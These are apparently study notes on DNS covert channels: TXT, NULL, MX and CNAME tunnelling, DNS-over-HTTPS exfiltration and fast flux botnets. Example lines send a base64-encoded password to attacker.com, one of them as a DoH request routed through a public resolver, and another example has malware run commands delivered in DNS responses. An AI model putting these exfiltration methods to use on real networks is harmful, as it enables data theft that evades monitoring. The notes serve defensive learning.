## 1. DNS TXT Covert Channels
A covert channel = **a hidden way to transfer data that bypasses normal controls**. Instead of sending data directly (HTTP, FTP…), you hide it inside something allowed.

Think:
- Firewall blocks HTTP exfiltration
- But DNS is always allowed (because systems need it)

**Victim sends data (exfiltration)**
The infected machine sends:
`secret-data.attacker.com`

**Attacker DNS server receives it**
They extract:
`secret-data`

**Malware does:**
`password=admin123 → base64 → YWRtaW4xMjM=`

**Then:**
`YWRtaW4xMjM=.attacker.com`
Attacker collects it via DNS logs.
## 2. DNS NULL Record Tunneling

###### Client sends request. Same as normal DNS tunneling:
`chunk1.attacker.com`

###### Attacker DNS server responds
Instead of:
`TXT: "command=whoami"`

It sends:
`NULL: [binary payload]`

Example (conceptually):
`NULL: 0x77686f616d69   ("whoami")`

###### Client parses binary
Malware:
- Reads raw bytes
- Executes command / processes data

###### Bidirectional communication
Like TXT tunneling:
- Queries → send data
- NULL responses → receive commands
## 3. DNS MX Record Tunneling
You only control:
- The **mail server hostname**

So attacker encodes data inside:
`<DATA>.attacker.com`

Example:
`example.com → MX 10 YWRtaW4=.attacker.com`
## 4. DNS CNAME Data Exfiltration
CNAME only allows:
- a **target hostname**

So attacker encodes data inside:
`<DATA>.attacker.com`

Example:
`victim.com → CNAME YWRtaW4=.attacker.com`
## 5. DNS Over HTTPS Covert Channels
##### What is DoH?
- DNS over HTTPS = sending DNS queries via HTTPS instead of UDP (port 53)
- Standard: RFC 8484
- Example:
```
https://dns.google/dns-query?name=example.com
```

Core Idea of Covert Channel is hide data inside DNS queries (subdomains) and send them through HTTPS → encrypted → invisible to network monitoring

##### How It Works
1. Encode data:
    ```
    admin123 → YWRtaW4xMjM=
    ```
2. Send request:
    ```
    https://dns.google/dns-query?name=YWRtaW4xMjM=.attacker.com
    ```
3. Attacker receives DNS query → extracts data
4. Response may contain commands (TXT, A, etc.)
##### Why It’s Powerful
- Encrypted → network can’t inspect domains
- Looks like normal HTTPS traffic
- Uses trusted providers:
    - Google DNS
    - Cloudflare
- Works even if DNS (port 53) is blocked
##### Limitations
- DNS size limits still apply (63-char labels)
- Low bandwidth (slow)
- Detectable at endpoint (EDR, OS logs)

## 6. Fast Flux DNS & Double Flux DNS
##### What is Fast Flux?
- A technique where a domain rapidly changes its IP addresses
- Uses many compromised machines (botnet) as rotating hosts

##### Core Idea
- One domain → many IPs → constantly changing
- Makes it hard to track or block the real server

##### How It Works
Attacker controls domain:
evil.com

DNS returns multiple IPs:
evil.com → 1.1.1.1 evil.com → 2.2.2.2 evil.com → 3.3.3.3

IPs change frequently (low TTL)
Each IP = compromised machine (proxy)

##### Types of Fast Flux
**Single Flux**
- Domain → many rotating IPs
- Backend server stays the same

**Double Flux**
- Domain → rotating IPs
- Nameservers also rotate